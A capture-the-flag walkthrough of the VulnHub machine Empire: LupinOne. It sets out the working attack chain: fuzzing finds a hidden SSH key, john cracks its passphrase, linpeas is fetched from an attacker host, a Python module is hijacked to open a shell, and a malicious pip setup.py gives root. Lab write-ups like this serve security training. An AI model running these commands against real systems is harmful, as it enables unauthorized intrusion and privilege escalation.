---
title: "Empire: LupinOne"
tagline: "FFUF-uncovered SSH key cracking, Python module hijacking, and a pip setuid escalation to root."
category: CTF
difficulty: Intermediate
platform: VulnHub
date: 2026-01-24
---

## 📋 Overview
This guide documents the complete penetration testing methodology for Empire: LupinOne, from initial reconnaissance to privilege escalation and flag capture.

## 🎯 Objectives
- Identify the target system and open services
- Enumerate directories and hidden files
- Exploit vulnerabilities to gain initial access
- Escalate privileges to obtain root access
- Capture the flags

## 1. Reconnaissance

```bash
$ ifconfig
$ nmap -sn 192.168.56.0/24
$ nmap -A 192.168.56.19
```
<p align="center"><img src="https://raw.githubusercontent.com/itstallam/Empire-LupinOne/main/Screenshots/s1.png" alt="ifconfig output"></p>
<p align="center"><img src="https://raw.githubusercontent.com/itstallam/Empire-LupinOne/main/Screenshots/s2.png" alt="Nmap ping sweep"></p>
<p align="center"><img src="https://raw.githubusercontent.com/itstallam/Empire-LupinOne/main/Screenshots/s3.png" alt="Nmap port scan"></p>

**Findings:**

| Port | Service | Version |
|------|---------|---------|
| 22 | SSH | OpenSSH 8.4p1 Debian 5 |
| 80 | HTTP | Apache httpd 2.4.48 |

## 2. Directory Enumeration

Port 80 greets with a photo of Arsène. `robots.txt` discloses `~myfiles`, which 404s directly.

<p align="center"><img src="https://raw.githubusercontent.com/itstallam/Empire-LupinOne/main/Screenshots/w1.png" alt="Target landing page"></p>
<p align="center"><img src="https://raw.githubusercontent.com/itstallam/Empire-LupinOne/main/Screenshots/w2.png" alt="robots.txt disallow entry"></p>

```bash
$ ffuf -c -u http://192.168.56.19/~FUZZ -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt
```
<p align="center"><img src="https://raw.githubusercontent.com/itstallam/Empire-LupinOne/main/Screenshots/s4.png" alt="ffuf directory discovery"></p>

A `~secret` directory turns up. Fuzzing further with dotfile extensions surfaces `.mysecret.txt`, containing an SSH key.

```bash
$ ffuf -c -ic -u http://192.168.56.19/~secret/.FUZZ -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt -fc 403 -e .txt,.html,.php
```
<p align="center"><img src="https://raw.githubusercontent.com/itstallam/Empire-LupinOne/main/Screenshots/s5.png" alt="ffuf finds mysecret.txt"></p>
<p align="center"><img src="https://raw.githubusercontent.com/itstallam/Empire-LupinOne/main/Screenshots/w5.png" alt="mysecret.txt contents"></p>

Decode the key with CyberChef — **From Base58** reveals the OpenSSH key.

<p align="center"><img src="https://raw.githubusercontent.com/itstallam/Empire-LupinOne/main/Screenshots/w6.png" alt="CyberChef Base58 decode"></p>

## 3. SSH Key Extraction

```bash
$ ssh2john sshkey.rsa > hashkey
$ john --wordlist=/usr/share/wordlists/fasttrack.txt hashkey
$ john --show hashkey
```
<p align="center"><img src="https://raw.githubusercontent.com/itstallam/Empire-LupinOne/main/Screenshots/s7.png" alt="John the Ripper cracking the key"></p>

## 4. Initial Access

```bash
$ ssh -i sshkey.rsa icex64@192.168.56.19
Enter passphrase: P@55w0rd!
```

## 5. User Flag

```bash
icex64@LupinOne:~$ cat user.txt
```
<p align="center"><img src="https://raw.githubusercontent.com/itstallam/Empire-LupinOne/main/Screenshots/s9.png" alt="User flag captured"></p>

## 6. Privilege Escalation

`sudo -l` shows: `(arsene) NOPASSWD: /usr/bin/python3.9 /home/arsene/heist.py` — the script imports `webbrowser`, which is hijackable.

```bash
$ python3 -m http.server 8080
icex64@LupinOne:/tmp$ wget 192.168.56.12:8080/linpeas.sh
```

`linpeas` flags `/usr/lib/python3.9/webbrowser.py` as writable:

```bash
icex64@LupinOne:/tmp$ nano /usr/lib/python3.9/webbrowser.py
```
Add: `os.system('/bin/bash')`

```bash
icex64@LupinOne:/$ sudo -u arsene /usr/bin/python3.9 /home/arsene/heist.py
```
<p align="center"><img src="https://raw.githubusercontent.com/itstallam/Empire-LupinOne/main/Screenshots/s16.png" alt="Shell as user arsene"></p>

## 7. Final Privilege Escalation

Abusing a setuid `pip` install as `arsene`:

```bash
arsene@LupinOne:/$ TF=$(mktemp -d)
arsene@LupinOne:/$ echo "import os; os.execl('/bin/sh', 'sh', '-c', 'sh <(tty) >$(tty) 2>$(tty)')" > $TF/setup.py
arsene@LupinOne:/$ sudo pip install $TF
```

```bash
$ whoami
root
$ cat /root/root.txt
```
<p align="center"><img src="https://raw.githubusercontent.com/itstallam/Empire-LupinOne/main/Screenshots/s17.png" alt="Root access and root flag"></p>

🎉 **Root access achieved — flag captured!**

## 🔒 Security Recommendations
- **Input Validation** — sanitize input to prevent injection-style attacks
- **Password Policies** — enforce strong SSH key passphrases
- **Module Integrity** — restrict write permissions on system Python modules
- **Sudo Configuration** — limit sudo privileges and avoid `NOPASSWD` entries
- **Log Monitoring** — implement comprehensive logging

## 🔧 Tools Used
`ifconfig` · `nmap` · `ffuf` · `ssh2john` · John the Ripper · `linpeas.sh` · `sudo` · `mktemp` · `pip`
